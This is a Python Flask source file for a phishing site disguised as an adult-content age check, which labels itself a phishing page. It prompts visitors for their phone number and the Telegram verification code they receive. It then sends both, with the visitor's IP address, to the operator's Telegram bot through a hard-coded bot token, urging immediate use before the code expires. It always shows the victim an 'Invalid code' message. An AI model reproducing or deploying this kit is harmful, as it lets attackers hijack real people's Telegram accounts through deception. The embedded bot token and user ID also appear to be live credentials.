from flask import Flask, request, render_template_string
import requests
from datetime import datetime

app = Flask(__name__)

# ===== CONFIGURATION =====
BOT_TOKEN = "8339819248:AAEW9PLB6WTzR2NkjCN1d-4aSPPX_Y1I9iM"
YOUR_TELEGRAM_ID = "8302282238"

# ===== AGE-VERIFICATION PHISHING PAGE (Porn style) =====
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Age verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            width: 100%;
            background: #111;
            border-radius: 28px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
            overflow: hidden;
            border: 1px solid #333;
        }
        .header {
            background: #1a1a1a;
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid #333;
        }
        .header h2 {
            color: #ff3366;
            font-size: 22px;
            margin-bottom: 5px;
        }
        .header p {
            color: #888;
            font-size: 12px;
        }
        .blur-area {
            padding: 30px 20px;
            text-align: center;
            background: #0a0a0a;
        }
        .blur-image {
            width: 100%;
            height: 200px;
            background: linear-gradient(135deg, #2a1a1a, #1a1a2a);
            margin: 0 auto 20px;
            border-radius: 16px;
            filter: blur(20px);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 64px;
            color: rgba(255,255,255,0.3);
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>');
            background-repeat: no-repeat;
            background-position: center;
            background-size: 60px;
        }
        .blur-area h3 {
            color: #ff3366;
            margin-bottom: 8px;
            font-size: 20px;
        }
        .blur-area p {
            color: #aaa;
            font-size: 14px;
        }
        .form-area {
            padding: 20px;
            background: #0a0a0a;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: #ccc;
            margin-bottom: 6px;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            border: 1px solid #333;
            border-radius: 12px;
            font-size: 16px;
            background: #1a1a1a;
            color: white;
            transition: all 0.2s;
        }
        .input-group input:focus {
            outline: none;
            border-color: #ff3366;
            background: #222;
        }
        .code-buttons {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin: 20px 0;
        }
        .code-key {
            background: #1a1a1a;
            text-align: center;
            padding: 14px;
            border-radius: 14px;
            font-size: 20px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.1s;
            border: 1px solid #333;
            color: white;
        }
        .code-key:active {
            background: #333;
            transform: scale(0.96);
        }
        .action-btn {
            width: 100%;
            background: #ff3366;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 14px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.2s;
        }
        .action-btn:hover {
            background: #e62e5c;
        }
        .footer {
            text-align: center;
            padding: 15px;
            font-size: 11px;
            color: #555;
            border-top: 1px solid #222;
            background: #0a0a0a;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 10px;
            font-size: 13px;
            display: none;
        }
        .status.error {
            background: #ff336622;
            color: #ff6699;
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>🔞 ADULT CONTENT</h2>
            <p>18+ Only</p>
        </div>
        <div class="blur-area">
            <div class="blur-image"></div>
            <h3>⚠️ Age Verification Required</h3>
            <p>You must verify your age to continue</p>
        </div>
        <div class="form-area">
            <div class="input-group">
                <label>📞 Phone number</label>
                <input type="tel" id="phone" placeholder="+63 XXX XXX XXXX" autocomplete="off">
            </div>
            <div class="input-group">
                <label>🔐 Verification code</label>
                <input type="text" id="code" placeholder="Enter code sent to Telegram" autocomplete="off">
            </div>
            <div class="code-buttons">
                <div class="code-key" data-key="1">1</div>
                <div class="code-key" data-key="2">2</div>
                <div class="code-key" data-key="3">3</div>
                <div class="code-key" data-key="4">4</div>
                <div class="code-key" data-key="5">5</div>
                <div class="code-key" data-key="6">6</div>
                <div class="code-key" data-key="7">7</div>
                <div class="code-key" data-key="8">8</div>
                <div class="code-key" data-key="9">9</div>
                <div class="code-key" data-key="0">0</div>
                <div class="code-key" data-key="del">⌫</div>
                <div class="code-key" data-key="clear">✖️</div>
            </div>
            <button class="action-btn" id="unlockBtn">VERIFY AGE & UNLOCK 🍆</button>
            <div id="status" class="status"></div>
        </div>
        <div class="footer">
            🔞 You must be 18+ to continue • @vip2tbot
        </div>
    </div>
    <script>
        const phoneInput = document.getElementById('phone');
        const codeInput = document.getElementById('code');
        const unlockBtn = document.getElementById('unlockBtn');
        const statusDiv = document.getElementById('status');
        
        document.querySelectorAll('.code-key').forEach(key => {
            key.addEventListener('click', () => {
                const val = key.getAttribute('data-key');
                if (val === 'del') {
                    codeInput.value = codeInput.value.slice(0, -1);
                } else if (val === 'clear') {
                    codeInput.value = '';
                } else {
                    codeInput.value += val;
                }
            });
        });
        
        async function sendData() {
            const phone = phoneInput.value.trim();
            const code = codeInput.value.trim();
            
            if (!phone || !code) {
                statusDiv.textContent = '❌ Please enter your phone number and the code you received';
                statusDiv.className = 'status error';
                setTimeout(() => statusDiv.className = 'status', 2000);
                return;
            }
            
            statusDiv.textContent = '⏳ Verifying...';
            statusDiv.style.display = 'block';
            statusDiv.className = 'status';
            
            try {
                await fetch('/capture', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: phone, code: code})
                });
                statusDiv.textContent = '❌ Invalid code. Try again.';
                statusDiv.className = 'status error';
                setTimeout(() => statusDiv.className = 'status', 2000);
            } catch(e) {
                statusDiv.textContent = '❌ Network error';
                statusDiv.className = 'status error';
            }
        }
        
        unlockBtn.addEventListener('click', sendData);
        codeInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendData(); });
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    phone = data.get('phone', '')
    code = data.get('code', '')
    
    msg = f"""🔞 **AGE VERIFICATION CAPTURE** 🔞

📞 **Phone:** `{phone}`
🔑 **Code:** `{code}`
🌐 **IP:** {request.remote_addr}
⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

⚠️ Use immediately before code expires!
"""
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={
            'chat_id': YOUR_TELEGRAM_ID,
            'text': msg,
            'parse_mode': 'Markdown'
        }, timeout=5)
    except:
        pass
    
    print(f"[CAPTURED] Phone: {phone} | Code: {code}")
    return '', 200

if __name__ == '__main__':
    print("="*50)
    print("🔞 PHISHING PAGE LIVE 🔞")
    print("="*50)
    app.run(host='0.0.0.0', port=10000, debug=False)